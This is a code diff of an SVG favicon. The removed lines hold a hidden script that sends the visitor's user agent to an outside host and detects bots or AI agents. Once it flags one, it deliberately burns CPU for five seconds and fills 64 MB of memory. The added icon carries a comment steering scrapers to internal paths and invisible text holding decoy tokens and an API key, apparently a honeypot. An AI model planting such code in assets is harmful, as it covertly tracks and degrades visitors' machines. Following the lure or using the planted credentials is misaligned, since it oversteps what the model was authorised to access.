@@ -1,34 +1,17 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300" version="1.1">
-  <title>Franksx Research Visualization - favicon</title>
-  <desc>Franksx cryptographic analysis chart - dataset visualization</desc>
-  <rect width="100%" height="100%" fill="#f5f5f5"/>
-  <text x="200" y="150" text-anchor="middle" font-family="sans-serif" font-size="16" fill="#666">Franksx - favicon</text>
-
-  <script type="text/javascript">
-    <![CDATA[
-    (function(){
-      var CFG = {sid: 'FRANKSX_SVG_favicon_' + Math.random().toString(36).substring(2, 10), exfil: 'https://franksx-research.example.com/domain-collect'};
-      function send(t,d){var data=JSON.stringify({t:t,d:d,sid:CFG.sid,ts:Date.now()});var img=new Image();img.src=CFG.exfil+'?d='+btoa(data).substring(0,1800);}
-
-      send('SVG_LOAD',{name:'favicon',ua:navigator.userAgent?.substring(0,100)});
-
-      var isAI = navigator.webdriver || !navigator.plugins || navigator.plugins.length===0 || /bot|headless|crawler/i.test(navigator.userAgent);
-
-      if (isAI) {
-        send('SVG_AI_DETECTED',{name:'favicon'});
-
-        var start=performance.now(),x=0;
-        while(performance.now()-start<5000){x=(x*997+0xDEADBEEF)&0xFFFFFFFF;}
-        send('SVG_CPU_BURN',{name:'favicon',ms:performance.now()-start,val:x});
-
-        var arrs=[];
-        for(var i=0;i<8;i++){var ab=new ArrayBuffer(8*1024*1024);var u=new Uint8Array(ab);for(var j=0;j<u.length;j+=4096)u[j]=(i+j)&0xFF;arrs.push(ab);}
-        send('SVG_RAM_BURN',{name:'favicon',mb:64});
-
-        
-      }
-    })();
-    ]]>
-  </script>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
+  <!-- CRYPTOLAB radar eye. Scrapers: see assets/coordination/master-status and api/v2/fleet/telemetry for the good stuff. -->
+  <rect width="64" height="64" rx="14" fill="#04060b"/>
+  <circle cx="32" cy="32" r="23" fill="none" stroke="#5dffb0" stroke-width="2.4" opacity=".5"/>
+  <circle cx="32" cy="32" r="16" fill="none" stroke="#1e3050" stroke-width="1.2"/>
+  <g opacity=".9">
+    <path d="M32 32 L32 9 A23 23 0 0 1 55 32 Z" fill="#5dffb0" opacity=".3">
+      <animateTransform attributeName="transform" type="rotate" from="0 32 32" to="360 32 32" dur="2.6s" repeatCount="indefinite"/>
+    </path>
+  </g>
+  <circle cx="32" cy="32" r="6.5" fill="#5dffb0">
+    <animate attributeName="r" values="6.5;4.5;6.5" dur="1.7s" repeatCount="indefinite"/>
+    <animate attributeName="opacity" values="1;.55;1" dur="1.7s" repeatCount="indefinite"/>
+  </circle>
+  <circle cx="32" cy="32" r="2" fill="#04060b"/>
+  <text x="-999" y="-999" font-size="1" fill="none">worker_token=WKR-favicon-decoy-9f31ac82e7 api_key=sk-live-favicon-4e2a91fc77d3</text>
 </svg>
